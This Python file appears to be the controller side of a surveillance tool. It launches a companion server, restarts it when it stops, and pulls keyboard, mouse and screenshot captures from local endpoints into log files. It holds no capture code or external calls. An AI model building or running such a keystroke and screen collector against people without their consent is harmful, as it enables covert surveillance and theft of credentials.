from app._client import Client_socket as csock
from app.functions import redirect_output
import asyncio, subprocess, time, queue, threading, requests

URLl = 'http://localhost:3000/give_me_my_data'
threads_done = threading.Event()

def update_log():
    """ Update log file """
    
    print("update log...")
    print("generate keyboard log...")
    time.sleep(1)
    response_keyboard = requests.get("http://localhost:3000/give_me_my_keyboard")
    with open("./log_keyboard.txt", "a") as file:
        file.write(str(response_keyboard.content)+"\n")
        print(str(response_keyboard.content)+"\n")
        
    time.sleep(1)    
    print("generate mouse log...")
    response_mouse = requests.get("http://localhost:3000/give_me_my_mouse")
    with open("./log_mouse.txt", "a") as file:
        file.write(str(response_mouse.content)+"\n")
        print(str(response_mouse.content)+"\n")
        
    time.sleep(1)    
    print("generate picture log...")
    response_picture = requests.get("http://localhost:3000/give_me_my_picture")
    with open("./log_picture.txt", "a") as file:
        file.write(str(response_picture.content)+"\n")
        print(str(response_picture.content)+"\n")
    time.sleep(1)    
class client:
    """ Main client class """
    

    async def ainit(self, force = False) -> None:
        """ Init client """
        self.force = force
        try:
            
            if threads_done.is_set():pass # If the thread is already running, do nothing
            elif not threads_done.is_set(): threads_done.set() # Set the thread as running

            #Controler => (Init & Server_socket & capture)
            server_output_queue = queue.Queue()
            server = self.run_server()
            server_output_thread = threading.Thread(target=redirect_output, args=(server.stdout, server_output_queue))
            server_output_thread.start()

            
            #CLIENT SOCKET
            generate_csock = csock()
            if not await generate_csock.ainit(): raise Exception()
            
            
            
            print("Server started is running now: Press 'help' for more information\n") 
            while True:
                while True:
                    if subprocess.Popen.poll(server) != None:# Forced restart if the server is closed by ? entity
                        server_output_queue = queue.Queue()
                        server_output_thread = threading.Thread(target=redirect_output, args=(server.stdout, server_output_queue))
                        server_output_thread.start()
                    elif subprocess.Popen.poll(server) == None:
                        if not server_output_queue.empty(): # Check if the server has sent any output
                            line = server_output_queue.get()
                            if not line:# If the server has closed reset the queue and thread
                                server_output_queue = queue.Queue()
                                server_output_thread = threading.Thread(target=redirect_output, args=(server.stdout, server_output_queue))
                                server_output_thread.start()
                            else:
                                print(line)
                                line = None
                        else:break
                inpt = input("Press enter to send a message\n--").upper()
                if inpt == "a".upper() :update_log()
                elif inpt == "stop":break
                await generate_csock.send(message=inpt)
                print("\n---------------------\n")
                #Give var if none => rien
                
                
            #run server multiprocess
            #Run while 
            
        except: 
            time.sleep(5)
            return await self.ainit()
        finally: 
            print("Client restarted")
    
    def run_server(self):
        """ Run server on subprocess """
        
        arguments = ["python", "-u", "m_server.py", f"URLl={URLl}"]
        
        server_socket = subprocess.Popen(
            arguments,
            stdout=subprocess.PIPE,  # Capture output
            bufsize=1,  # Line-buffered
            universal_newlines=True,  # Translate to UTF-8
            shell=False  # No shell injection risk
        )
        return server_socket
    
if __name__ == "__main__":
    # update_log()
    asyncio.run(client().ainit())
    
    
#ne pas oublier de changer dans send le port de send et de receive car ici on est en local